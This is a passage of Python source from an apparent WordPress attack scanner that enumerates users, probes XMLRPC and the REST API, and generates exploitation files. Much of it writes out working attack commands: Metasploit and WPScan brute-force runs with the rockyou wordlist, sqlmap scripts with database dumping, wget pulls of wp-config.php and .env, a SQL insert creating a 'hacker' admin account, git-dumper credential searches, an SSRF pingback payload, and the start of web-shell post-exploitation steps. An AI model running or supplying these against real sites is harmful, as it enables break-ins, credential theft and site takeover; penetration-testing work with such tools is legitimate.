    def test_user_enumeration(self) -> None:
        """Test for user enumeration vulnerabilities"""
        self.log("[*] Testing for user enumeration vulnerabilities...", Fore.BLUE)

        # Method 1: Author archive enumeration
        self.log("    Testing author archive enumeration...", Fore.YELLOW, "debug")
        found_users = []

        for user_id in range(1, 6):  # Test first 5 users
            url = f"{self.target_url}/?author={user_id}"
            r = self.make_request(url, timeout=(5, 10), allow_redirects=True)

            if r and r.status_code == 200:
                # Try to extract username from URL or content
                username_match = re.search(r'/author/([^/\'"]+)', r.url)
                if username_match:
                    username = username_match.group(1)
                    found_users.append(username)
                    self.found_users.append(username)
                    self.log(f"    [!] User found (ID {user_id}): {username}", Fore.YELLOW)

        if found_users:
            self.add_vulnerability(
                "User Enumeration via Author Archives",
                f"Found usernames: {', '.join(found_users)}",
                "low"
            )
            self.log(f"    [!] Found {len(found_users)} users via author enumeration", Fore.RED)
        else:
            self.log("    [+] Author enumeration appears to be blocked", Fore.GREEN, "debug")

        # Method 2: Check REST API for users (done in REST analysis)
        # Method 3: wp-login.php differential response
        if self.deep_scan:
            self.test_login_user_enum()

    def test_login_user_enum(self) -> None:
        """Test wp-login.php for user enumeration via differential responses"""
        self.log("    Testing wp-login.php for user enumeration...", Fore.YELLOW, "debug")

        login_url = f"{self.target_url}/wp-login.php"

        # Test with likely invalid username
        data1 = {"log": "nonexistentuser123456", "pwd": "wrongpass"}
        r1 = self.make_request(login_url, method="POST", data=data1, timeout=(5, 10), allow_redirects=False)

        # Test with common username
        data2 = {"log": "admin", "pwd": "wrongpass"}
        r2 = self.make_request(login_url, method="POST", data=data2, timeout=(5, 10), allow_redirects=False)

        if r1 and r2:
            # Check for different error messages
            if r1.text != r2.text:
                invalid_msg = "Invalid username" in r1.text or "is incorrect" in r1.text
                wrong_pwd_msg = "password" in r2.text.lower()

                if invalid_msg or wrong_pwd_msg:
                    self.log(
                        "    [!] Login form may leak user existence via error messages",
                        Fore.YELLOW
                    )
                    self.add_vulnerability(
                        "User Enumeration via Login Form",
                        "Login form provides different error messages for valid/invalid users",
                        "low"
                    )

    # ---------------- XMLRPC VULNERABILITY TESTING ----------------

    def test_xmlrpc_vulnerabilities(self) -> None:
        """Test XMLRPC endpoint for common vulnerabilities"""
        self.log("[*] Testing XMLRPC endpoint for vulnerabilities...", Fore.BLUE)

        xmlrpc_url = f"{self.target_url}/xmlrpc.php"

        # Check if XMLRPC is enabled
        r = self.make_request(xmlrpc_url, method="POST",
                             data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                             timeout=(5, 15))

        if not r or r.status_code != 200:
            self.log("    [+] XMLRPC appears to be disabled or blocked", Fore.GREEN)
            return

        self.log("    [!] XMLRPC is enabled and responding", Fore.YELLOW)
        self.xmlrpc_enabled = True

        # Test 1: Check for available methods
        if "methodResponse" in r.text:
            methods = re.findall(r'<string>([^<]+)</string>', r.text)
            self.log(f"    Found {len(methods)} available XMLRPC methods", Fore.CYAN, "debug")

            # Check for dangerous methods
            dangerous_methods = ["pingback.ping", "system.multicall"]
            found_dangerous = [m for m in dangerous_methods if m in methods]

            if found_dangerous:
                self.dangerous_xmlrpc_methods = found_dangerous
                self.log(
                    f"    [!] Dangerous methods available: {', '.join(found_dangerous)}",
                    Fore.RED
                )
                self.add_vulnerability(
                    "XMLRPC Dangerous Methods Enabled",
                    f"XMLRPC has dangerous methods enabled: {', '.join(found_dangerous)}. Can be used for brute force amplification or DDoS",
                    "high"
                )

        # Test 2: Check for pingback functionality
        if self.deep_scan:
            self.log("    Testing pingback functionality...", Fore.YELLOW, "debug")
            pingback_data = """<?xml version="1.0"?>
            <methodCall>
                <methodName>pingback.ping</methodName>
                <params>
                    <param><value><string>http://example.com/test</string></value></param>
                    <param><value><string>{}</string></value></param>
                </params>
            </methodCall>""".format(self.target_url)

            r = self.make_request(xmlrpc_url, method="POST", data=pingback_data, timeout=(5, 10))
            if r and "faultCode" not in r.text:
                self.log("    [!] Pingback may be exploitable for SSRF/DDoS", Fore.RED)

    # ---------------- REST API CLASSIFICATION ----------------

    @staticmethod
    def classify_namespace(namespace: str, route: str) -> Tuple[str, str]:
        """Classify endpoint namespace into category + plugin name"""
        if not namespace:
            namespace = ""

        ns = namespace.lower()

        # Core WP
        if ns.startswith("wp/"):
            return "Core", "WordPress Core"

        # Known plugins
        known_plugins = {
            "wc/": "WooCommerce",
            "woocommerce": "WooCommerce",
            "yoast": "Yoast SEO",
            "jetpack": "Jetpack",
            "akismet": "Akismet",
            "contact-form-7": "Contact Form 7",
            "cf7": "Contact Form 7",
            "gf/": "Gravity Forms",
            "gravityforms": "Gravity Forms",
            "wordfence": "Wordfence",
            "rankmath": "Rank Math SEO",
            "elementor": "Elementor",
            "polylang": "Polylang",
            "wpml": "WPML",
        }

        for key, name in known_plugins.items():
            if key in ns:
                return "Plugin", name

        # Theme-ish heuristics
        if "/theme" in route or "/themes" in route:
            return "Theme", "Theme-related"

        return "Custom", "Custom/Unknown"

    @staticmethod
    def detect_user_enum(route: str) -> bool:
        """Heuristic to flag potential user enumeration endpoints"""
        lowered = route.lower()
        risky_keywords = [
            "/wp/v2/users",
            "/users",
            "/customers",
            "/members",
            "/subscribers",
        ]
        return any(kw in lowered for kw in risky_keywords)

    @staticmethod
    def is_write_capable(methods: List[str]) -> bool:
        """Check if any HTTP method is write-capable"""
        write_methods = {"POST", "PUT", "PATCH", "DELETE"}
        return any(m.upper() in write_methods for m in methods)

    def build_endpoints_index(self) -> None:
        """Parse API data and build endpoints info + summary"""
        routes = self.api_data.get('routes', {})
        namespaces = self.api_data.get('namespaces', [])

        endpoints_info = []

        for route, details in routes.items():
            methods = []
            namespace = details.get('namespace', '')

            # Extract methods
            if 'endpoints' in details:
                for ep in details['endpoints']:
                    ep_methods = ep.get('methods', [])
                    if isinstance(ep_methods, list):
                        methods.extend(ep_methods)
                    elif isinstance(ep_methods, str):
                        methods.append(ep_methods)

            methods = sorted(list(set(m.upper() for m in methods)))

            category, plugin_name = self.classify_namespace(namespace, route)
            is_user_enum = self.detect_user_enum(route)
            is_write = self.is_write_capable(methods)

            endpoints_info.append({
                "route": route,
                "methods": methods,
                "namespace": namespace,
                "category": category,
                "plugin_name": plugin_name,
                "is_user_enum": is_user_enum,
                "is_write": is_write,
            })

        # Build summary
        total_routes = len(endpoints_info)
        method_counts = {}
        writeable_count = 0
        user_enum_count = 0
        category_counts = {}

        for ep in endpoints_info:
            for m in ep['methods']:
                method_counts[m] = method_counts.get(m, 0) + 1

            if ep['is_write']:
                writeable_count += 1
            if ep['is_user_enum']:
                user_enum_count += 1

            cat = ep['category']
            category_counts[cat] = category_counts.get(cat, 0) + 1

        self.endpoints_info = endpoints_info
        self.summary = {
            "total_routes": total_routes,
            "method_counts": method_counts,
            "writeable_count": writeable_count,
            "user_enum_count": user_enum_count,
            "category_counts": category_counts,
            "namespaces": namespaces,
        }

    def export_endpoints(self) -> None:
        """Export endpoints and summary to JSON & TXT"""
        if not self.endpoints_info:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")

        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        # Create output directory if specified
        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        json_filename = os.path.join(output_path, f"waduh_{host_safe}_endpoints_{timestamp}.json")
        txt_filename = os.path.join(output_path, f"waduh_{host_safe}_endpoints_{timestamp}.txt")

        export_data = {
            "target": self.target_url,
            "generated_utc": timestamp,
            "summary": self.summary,
            "endpoints": self.endpoints_info,
        }

        try:
            with open(json_filename, "w", encoding="utf-8") as f:
                json.dump(export_data, f, indent=2)
            self.log(f"[+] Exported JSON report: {json_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write JSON export to {json_filename}: {e}", Fore.RED)

        try:
            with open(txt_filename, "w", encoding="utf-8") as f:
                f.write(f"W.A.D.U.H. REST API Report for {self.target_url}\n")
                f.write(f"Generated (UTC): {timestamp}\n\n")
                f.write("=== SUMMARY ===\n")
                f.write(f"Total routes: {self.summary.get('total_routes', 0)}\n")
                f.write(f"Category counts: {self.summary.get('category_counts', {})}\n")
                f.write(f"Method counts: {self.summary.get('method_counts', {})}\n")
                f.write(f"Write-capable endpoints: {self.summary.get('writeable_count', 0)}\n")
                f.write(f"Potential user-enum endpoints: {self.summary.get('user_enum_count', 0)}\n")
                f.write("\n=== ENDPOINTS ===\n")

                for ep in sorted(self.endpoints_info, key=lambda x: x['route']):
                    line = (
                        f"{ep['route']} | Methods: {ep['methods']} | "
                        f"Namespace: {ep['namespace']} | Category: {ep['category']} | "
                        f"Plugin: {ep['plugin_name']} | UserEnum: {ep['is_user_enum']} | "
                        f"Write: {ep['is_write']}\n"
                    )
                    f.write(line)

            self.log(f"[+] Exported TXT report: {txt_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write TXT export to {txt_filename}: {e}", Fore.RED)

    def print_rest_summary(self) -> None:
        """Print human-friendly REST API summary"""
        if not self.summary:
            return

        self.log("\n[*] REST API Summary:", Fore.MAGENTA)
        self.log(f"    Total routes: {self.summary['total_routes']}")

        cat_counts = self.summary.get('category_counts', {})
        if cat_counts:
            self.log("    By category:")
            for cat, count in cat_counts.items():
                self.log(f"      - {cat}: {count}")

        method_counts = self.summary.get('method_counts', {})
        if method_counts:
            self.log("    HTTP methods distribution:")
            for m, count in sorted(method_counts.items()):
                self.log(f"      - {m}: {count}")

        self.log(
            f"    Write-capable endpoints: {self.summary['writeable_count']} "
            f"(POST/PUT/PATCH/DELETE)"
        )
        self.log(
            f"    Potential user-enum endpoints: {self.summary['user_enum_count']}"
        )

        namespaces = self.summary.get('namespaces', [])
        if namespaces:
            self.log("    Namespaces detected:")
            for ns in namespaces:
                self.log(f"      - {ns}")

    # ---------------- REST API ANALYSIS ----------------

    def analyze_rest_api(self) -> None:
        """Analyze /wp-json for exposed endpoints"""
        self.log("\n[*] Starting REST API Analysis (/wp-json)...", Fore.BLUE)
        api_url = f"{self.target_url}/wp-json"

        r = self.make_request(api_url, timeout=(5, 20))

        if not r:
            self.log("[!] Failed to contact REST API", Fore.RED)
            return

        if r.status_code == 200:
            self.log("[+] REST API is Exposed (Status 200 OK)", Fore.GREEN)
            try:
                self.api_data = r.json()
            except json.JSONDecodeError:
                self.log(
                    "[!] Response was 200 OK but not valid JSON. (Likely HTML/WAF page)",
                    Fore.RED
                )
                return

            # Basic Info
            name = self.api_data.get('name', 'Unknown')
            desc = self.api_data.get('description', 'Unknown')
            self.log(f"    Site Name: {name}")
            self.log(f"    Description: {desc}")

            # Build index & summary
            self.build_endpoints_index()

            self.log(
                f"\n[*] Listing ALL Available Endpoints ({len(self.endpoints_info)} found):",
                Fore.MAGENTA
            )

            # Group by category
            groups = {"Core": [], "Plugin": [], "Theme": [], "Custom": []}
            for ep in self.endpoints_info:
                groups[ep['category']].append(ep)

            for category in ["Core", "Plugin", "Theme", "Custom"]:
                eps = groups.get(category, [])
                if not eps:
                    continue

                self.log(f"\n  == {category} Endpoints ({len(eps)}) ==", Fore.YELLOW)

                for ep in sorted(eps, key=lambda x: x['route']):
                    prefix = ""
                    color = Fore.CYAN

                    if ep['is_user_enum']:
                        prefix += "[USER-ENUM] "
                        color = Fore.RED
                    if ep['is_write']:
                        prefix += "[WRITE] "
                        color = Fore.RED

                    if category == "Plugin" and ep['plugin_name']:
                        prefix += f"[{ep['plugin_name']}] "

                    line = (
                        f"    {prefix}Path: {ep['route']} | "
                        f"Methods: {ep['methods']} | "
                        f"NS: {ep['namespace']}"
                    )
                    self.log(line, color, "debug" if not (ep['is_user_enum'] or ep['is_write']) else "info")

            self.print_rest_summary()
            self.export_endpoints()
            self.log("\n[!] REST API Analysis Complete.", Fore.YELLOW)

        elif r.status_code in [401, 403]:
            self.log("[+] REST API is Protected (403/401). This is secure.", Fore.GREEN)

        elif r.status_code == 404:
            self.log("[-] REST API not found (404). It might be disabled.", Fore.YELLOW)

        else:
            self.log(f"[-] Non-standard response: {r.status_code}", Fore.YELLOW)

    # ---------------- FINAL SUMMARY REPORT ----------------

    def generate_final_report(self) -> None:
        """Generate comprehensive final report"""
        self.log("\n" + "="*60, Fore.CYAN + Style.BRIGHT)
        self.log("                    FINAL SECURITY REPORT", Fore.CYAN + Style.BRIGHT)
        self.log("="*60 + "\n", Fore.CYAN + Style.BRIGHT)

        # Vulnerabilities
        if self.vulnerabilities:
            self.log(f"[!] VULNERABILITIES FOUND: {len(self.vulnerabilities)}", Fore.RED + Style.BRIGHT)

            # Group by severity
            critical = [v for v in self.vulnerabilities if v['severity'] == 'critical']
            high = [v for v in self.vulnerabilities if v['severity'] == 'high']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'medium']
            low = [v for v in self.vulnerabilities if v['severity'] == 'low']

            if critical:
                self.log(f"\n  CRITICAL ({len(critical)}):", Fore.RED + Style.BRIGHT)
                for v in critical:
                    self.log(f"    - {v['title']}: {v['description']}", Fore.RED)

            if high:
                self.log(f"\n  HIGH ({len(high)}):", Fore.RED)
                for v in high:
                    self.log(f"    - {v['title']}: {v['description']}", Fore.RED)

            if medium:
                self.log(f"\n  MEDIUM ({len(medium)}):", Fore.YELLOW)
                for v in medium:
                    self.log(f"    - {v['title']}", Fore.YELLOW)

            if low:
                self.log(f"\n  LOW ({len(low)}):", Fore.CYAN)
                for v in low:
                    self.log(f"    - {v['title']}", Fore.CYAN)
        else:
            self.log("[+] No vulnerabilities found", Fore.GREEN)

        # Information Leaks
        if self.info_leaks:
            self.log(f"\n[!] INFORMATION LEAKS: {len(self.info_leaks)}", Fore.YELLOW)
            for leak in self.info_leaks[:10]:  # Show first 10
                self.log(f"    - {leak['title']}", Fore.YELLOW)

        # Security Issues
        if self.security_issues:
            self.log(f"\n[!] SECURITY MISCONFIGURATIONS: {len(self.security_issues)}", Fore.YELLOW)
            for issue in self.security_issues[:10]:  # Show first 10
                self.log(f"    - {issue['title']}", Fore.YELLOW)

        # Export full report
        self.export_full_report()

        # Export exploitation files
        self.export_exploitation_guide()
        self.export_metasploit_rc()
        self.export_sqlmap_commands()
        self.generate_poc_scripts()

        self.log("\n" + "="*60, Fore.CYAN + Style.BRIGHT)
        self.log("                    SCAN COMPLETE", Fore.GREEN + Style.BRIGHT)
        self.log("="*60 + "\n", Fore.CYAN + Style.BRIGHT)

    def export_full_report(self) -> None:
        """Export comprehensive JSON report with all findings"""
        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")

        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        report_filename = os.path.join(output_path, f"waduh_{host_safe}_full_report_{timestamp}.json")

        report_data = {
            "target": self.target_url,
            "scan_date": timestamp,
            "wordpress_version": self.wp_version,
            "vulnerabilities": self.vulnerabilities,
            "information_leaks": self.info_leaks,
            "security_issues": self.security_issues,
            "statistics": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                "high": len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                "medium": len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                "low": len([v for v in self.vulnerabilities if v['severity'] == 'low']),
                "info_leaks": len(self.info_leaks),
                "security_issues": len(self.security_issues),
            }
        }

        try:
            with open(report_filename, "w", encoding="utf-8") as f:
                json.dump(report_data, f, indent=2)
            self.log(f"[+] Full security report exported: {report_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write full report to {report_filename}: {e}", Fore.RED)

    # ---------------- EXPLOITATION EXPORTS ----------------

    def export_metasploit_rc(self) -> None:
        """Export findings to Metasploit resource file format"""
        if not self.export_metasploit:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        rc_filename = os.path.join(output_path, f"waduh_{host_safe}_metasploit_{timestamp}.rc")

        try:
            with open(rc_filename, "w", encoding="utf-8") as f:
                f.write("# W.A.D.U.H. Scanner - Metasploit Resource File\n")
                f.write(f"# Target: {self.target_url}\n")
                f.write(f"# Generated: {timestamp}\n")
                f.write("# AUTHORIZED USE ONLY\n\n")

                # XMLRPC Brute Force
                if self.xmlrpc_enabled and self.found_users:
                    f.write("# ============================================================\n")
                    f.write("# XMLRPC Brute Force Attack\n")
                    f.write("# ============================================================\n")
                    f.write("use auxiliary/scanner/http/wordpress_xmlrpc_login\n")
                    f.write(f"set RHOSTS {parsed.hostname}\n")
                    if parsed.port:
                        f.write(f"set RPORT {parsed.port}\n")
                    f.write(f"set TARGETURI {parsed.path or '/'}\n")
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                    f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                    f.write("set STOP_ON_SUCCESS true\n")
                    f.write("set VERBOSE true\n")
                    f.write("run\n\n")

                    # Multi-user attack
                    if len(self.found_users) > 1:
                        f.write("# Multiple users found - create user list\n")
                        f.write(f"# Users: {', '.join(self.found_users)}\n")
                        userlist_file = os.path.join(output_path, f"waduh_{host_safe}_users_{timestamp}.txt")
                        with open(userlist_file, "w") as uf:
                            for user in self.found_users:
                                uf.write(f"{user}\n")
                        f.write(f"# User list saved to: {userlist_file}\n")
                        f.write("# set USER_FILE " + userlist_file + "\n\n")

                # WP Login Brute Force
                if self.found_users:
                    f.write("# ============================================================\n")
                    f.write("# WordPress Login Brute Force\n")
                    f.write("# ============================================================\n")
                    f.write("use auxiliary/scanner/http/wordpress_login_enum\n")
                    f.write(f"set RHOSTS {parsed.hostname}\n")
                    if parsed.port:
                        f.write(f"set RPORT {parsed.port}\n")
                    f.write(f"set TARGETURI {parsed.path or '/'}\n")
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                    f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                    f.write("set STOP_ON_SUCCESS true\n")
                    f.write("run\n\n")

                # Plugin vulnerability checks
                if self.detected_plugins:
                    f.write("# ============================================================\n")
                    f.write("# Plugin Vulnerability Checks\n")
                    f.write("# ============================================================\n")
                    f.write(f"# Detected plugins: {', '.join([p['slug'] for p in self.detected_plugins])}\n")
                    f.write("# Search for exploits with: search wordpress [plugin_name]\n")
                    f.write("# Example: search wordpress contact-form-7\n\n")

                f.write("# ============================================================\n")
                f.write("# Manual Steps:\n")
                f.write("# 1. Load this file: msfconsole -r " + rc_filename + "\n")
                f.write("# 2. Monitor output for successful authentication\n")
                f.write("# 3. Use valid credentials for post-exploitation\n")
                f.write("# ============================================================\n")

            self.log(f"[+] Metasploit resource file exported: {rc_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write Metasploit file: {e}", Fore.RED)

    def export_sqlmap_commands(self) -> None:
        """Export SQLMap commands for SQL injection testing"""
        if not self.export_sqlmap:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        sqlmap_filename = os.path.join(output_path, f"waduh_{host_safe}_sqlmap_{timestamp}.sh")

        try:
            with open(sqlmap_filename, "w", encoding="utf-8") as f:
                f.write("#!/bin/bash\n")
                f.write("# W.A.D.U.H. Scanner - SQLMap Command Script\n")
                f.write(f"# Target: {self.target_url}\n")
                f.write(f"# Generated: {timestamp}\n")
                f.write("# AUTHORIZED USE ONLY\n\n")

                if self.sql_injection_params:
                    f.write("# ============================================================\n")
                    f.write("# SQL Injection Testing (Database errors detected)\n")
                    f.write("# ============================================================\n\n")

                    for param in self.sql_injection_params:
                        url = f"{self.target_url}/{param}"
                        f.write(f"# Test parameter: {param}\n")
                        f.write(f"sqlmap -u \"{url}\" \\\n")
                        f.write("  --batch \\\n")
                        f.write("  --random-agent \\\n")
                        f.write("  --level=2 \\\n")
                        f.write("  --risk=2 \\\n")
                        f.write("  --technique=BEUST \\\n")
                        f.write("  --threads=5 \\\n")
                        f.write("  --dbs\n\n")
                else:
                    f.write("# No SQL injection points detected during scan\n")
                    f.write("# Try manual testing on search forms and URL parameters\n\n")

                # Generic WordPress SQL injection tests
                f.write("# ============================================================\n")
                f.write("# Generic WordPress SQL Injection Tests\n")
                f.write("# ============================================================\n\n")

                f.write("# Test search parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?s=test\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Test category parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?cat=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Test post ID parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?p=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                # REST API testing
                f.write("# ============================================================\n")
                f.write("# REST API SQL Injection Tests\n")
                f.write("# ============================================================\n\n")
                f.write(f"sqlmap -u \"{self.target_url}/wp-json/wp/v2/posts?per_page=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=3 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Make executable: chmod +x " + sqlmap_filename + "\n")

            # Make the script executable on Unix-like systems
            try:
                os.chmod(sqlmap_filename, 0o755)
            except:
                pass

            self.log(f"[+] SQLMap commands exported: {sqlmap_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write SQLMap file: {e}", Fore.RED)

    def export_exploitation_guide(self) -> None:
        """Export detailed step-by-step exploitation instructions"""
        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        guide_filename = os.path.join(output_path, f"waduh_{host_safe}_exploitation_guide_{timestamp}.md")

        try:
            with open(guide_filename, "w", encoding="utf-8") as f:
                f.write("# WordPress Exploitation Guide\n\n")
                f.write(f"**Target:** {self.target_url}\n\n")
                f.write(f"**Generated:** {timestamp}\n\n")
                f.write(f"**WordPress Version:** {self.wp_version or 'Unknown'}\n\n")
                f.write("**⚠️ AUTHORIZED USE ONLY**\n\n")
                f.write("---\n\n")

                # Table of contents
                f.write("## Table of Contents\n\n")
                f.write("1. [Executive Summary](#executive-summary)\n")
                f.write("2. [Reconnaissance Data](#reconnaissance-data)\n")
                f.write("3. [Exploitation Paths](#exploitation-paths)\n")
                f.write("4. [Command Reference](#command-reference)\n")
                f.write("5. [Post-Exploitation](#post-exploitation)\n\n")
                f.write("---\n\n")

                # Executive Summary
                f.write("## Executive Summary\n\n")
                critical_count = len([v for v in self.vulnerabilities if v['severity'] == 'critical'])
                high_count = len([v for v in self.vulnerabilities if v['severity'] == 'high'])
                f.write(f"- **Critical Vulnerabilities:** {critical_count}\n")
                f.write(f"- **High Vulnerabilities:** {high_count}\n")
                f.write(f"- **Enumerated Users:** {len(self.found_users)}\n")
                f.write(f"- **Detected Plugins:** {len(self.detected_plugins)}\n")
                f.write(f"- **XMLRPC Enabled:** {'Yes' if self.xmlrpc_enabled else 'No'}\n\n")

                # Reconnaissance Data
                f.write("## Reconnaissance Data\n\n")

                if self.found_users:
                    f.write("### Enumerated Usernames\n\n")
                    f.write("```\n")
                    for user in self.found_users:
                        f.write(f"{user}\n")
                    f.write("```\n\n")
                    f.write("**Attack Vector:** Use these for brute force attacks on wp-login.php or XMLRPC\n\n")

                if self.detected_plugins:
                    f.write("### Detected Plugins\n\n")
                    f.write("| Plugin | Version |\n")
                    f.write("|--------|--------|\n")
                    for plugin in self.detected_plugins:
                        version = plugin.get('version') or 'Unknown'
                        f.write(f"| {plugin['slug']} | {version} |\n")
                    f.write("\n**Attack Vector:** Search for CVEs and Metasploit modules for each plugin\n\n")

                if self.detected_themes:
                    f.write("### Detected Themes\n\n")
                    f.write("| Theme | Version |\n")
                    f.write("|-------|--------|\n")
                    for theme in self.detected_themes:
                        version = theme.get('version') or 'Unknown'
                        f.write(f"| {theme['slug']} | {version} |\n")
                    f.write("\n")

                # Exploitation Paths
                f.write("## Exploitation Paths\n\n")

                # Critical vulnerabilities first
                critical_vulns = [v for v in self.vulnerabilities if v['severity'] == 'critical']
                if critical_vulns:
                    f.write("### 🔴 CRITICAL - Immediate Exploitation Paths\n\n")
                    for i, vuln in enumerate(critical_vulns, 1):
                        f.write(f"#### {i}. {vuln['title']}\n\n")
                        f.write(f"**Description:** {vuln['description']}\n\n")

                        # Specific exploitation steps based on vulnerability type
                        if "wp-config" in vuln['title'].lower() or ".env" in vuln['title'].lower():
                            f.write("**Exploitation Steps:**\n\n")
                            f.write("1. Download the exposed configuration file:\n")
                            f.write("   ```bash\n")
                            if "wp-config" in vuln['title'].lower():
                                f.write(f"   wget {self.target_url}/wp-config.php\n")
                            else:
                                f.write(f"   wget {self.target_url}/.env\n")
                            f.write("   ```\n\n")
                            f.write("2. Extract database credentials from the file\n")
                            f.write("3. Connect to database remotely (if exposed):\n")
                            f.write("   ```bash\n")
                            f.write("   mysql -h [DB_HOST] -u [DB_USER] -p[DB_PASSWORD] [DB_NAME]\n")
                            f.write("   ```\n\n")
                            f.write("4. Create admin user via SQL injection:\n")
                            f.write("   ```sql\n")
                            f.write("   INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status)\n")
                            f.write("   VALUES ('hacker', MD5('password123'), 'hacker', 'hacker@email.com', 0);\n")
                            f.write("   ```\n\n")

                        elif ".git" in vuln['title'].lower():
                            f.write("**Exploitation Steps:**\n\n")
                            f.write("1. Download Git repository using git-dumper:\n")
                            f.write("   ```bash\n")
                            f.write(f"   git-dumper {self.target_url}/.git ./git-dump\n")
                            f.write("   ```\n\n")
                            f.write("2. Search for credentials in the repository:\n")
                            f.write("   ```bash\n")
                            f.write("   cd git-dump\n")
                            f.write("   git log --all --full-history --source -- '*config*' '*password*' '*.env*'\n")
                            f.write("   grep -r 'password' .\n")
                            f.write("   ```\n\n")

                # XMLRPC exploitation
                if self.xmlrpc_enabled:
                    f.write("### 🟡 XMLRPC-Based Attacks\n\n")
                    f.write("#### Brute Force via XMLRPC\n\n")
                    f.write("**Why:** XMLRPC allows testing multiple credentials in a single request\n\n")
                    f.write("**Exploitation:**\n\n")
                    if self.found_users:
                        f.write(f"1. Using found username: `{self.found_users[0]}`\n\n")
                    f.write("```bash\n")
                    f.write("# Using WPScan\n")
                    if self.found_users:
                        f.write(f"wpscan --url {self.target_url} --passwords /usr/share/wordlists/rockyou.txt --usernames {self.found_users[0]}\n\n")
                    f.write("# Using Python script\n")
                    f.write("python3 xmlrpc_brute.py " + self.target_url + "\n")
                    f.write("```\n\n")

                    if "pingback.ping" in self.dangerous_xmlrpc_methods:
                        f.write("#### SSRF via Pingback\n\n")
                        f.write("**Exploitation:**\n\n")
                        f.write("```bash\n")
                        f.write(f"curl -X POST {self.target_url}/xmlrpc.php \\\n")
                        f.write("  -d '<?xml version=\"1.0\"?>\n")
                        f.write("  <methodCall>\n")
                        f.write("    <methodName>pingback.ping</methodName>\n")
                        f.write("    <params>\n")
                        f.write("      <param><value><string>http://internal-server:8080/admin</string></value></param>\n")
                        f.write(f"      <param><value><string>{self.target_url}/test</string></value></param>\n")
                        f.write("    </params>\n")
                        f.write("  </methodCall>'\n")
                        f.write("```\n\n")

                # SQL Injection exploitation
                if self.sql_injection_params:
                    f.write("### 🟡 SQL Injection Exploitation\n\n")
                    f.write(f"**Vulnerable Parameters:** {', '.join(self.sql_injection_params)}\n\n")
                    f.write("**Exploitation:**\n\n")
                    f.write("```bash\n")
                    f.write(f"sqlmap -u \"{self.target_url}/{self.sql_injection_params[0]}\" \\\n")
                    f.write("  --batch \\\n")
                    f.write("  --level=3 \\\n")
                    f.write("  --risk=2 \\\n")
                    f.write("  --dbs \\\n")
                    f.write("  --dump\n")
                    f.write("```\n\n")

                # Command Reference
                f.write("## Command Reference\n\n")

                f.write("### WPScan\n\n")
                f.write("```bash\n")
                f.write(f"# Full enumeration\n")
                f.write(f"wpscan --url {self.target_url} --enumerate ap,at,u\n\n")
                if self.found_users:
                    f.write(f"# Brute force with found users\n")
                    f.write(f"wpscan --url {self.target_url} --passwords /usr/share/wordlists/rockyou.txt --usernames {','.join(self.found_users)}\n")
                f.write("```\n\n")

                f.write("### Metasploit\n\n")
                f.write("```bash\n")
                f.write("msfconsole\n")
                f.write("use auxiliary/scanner/http/wordpress_login_enum\n")
                f.write(f"set RHOSTS {parsed.hostname}\n")
                if self.found_users:
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                f.write("run\n")
                f.write("```\n\n")

                # Post-Exploitation
                f.write("## Post-Exploitation\n\n")
                f.write("After gaining admin access:\n\n")
                f.write("1. **Upload Web Shell via Theme Editor:**\n")
                f.write("   - Navigate to Appearance → Theme Editor\n")
